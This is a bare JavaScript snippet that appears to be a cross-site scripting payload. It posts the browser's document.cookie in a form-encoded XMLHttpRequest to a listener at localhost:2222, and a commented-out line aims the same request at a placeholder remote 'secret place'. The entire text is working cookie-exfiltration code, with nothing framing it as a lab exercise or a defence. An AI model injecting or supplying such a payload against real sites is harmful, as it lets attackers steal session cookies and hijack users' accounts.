var xhr = new XMLHttpRequest();
        //xhr.open("POST", "http://some-site.com/some-secret-place", true);
        xhr.open("POST", "http://localhost:2222", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        xhr.send("cookie="+document.cookie);
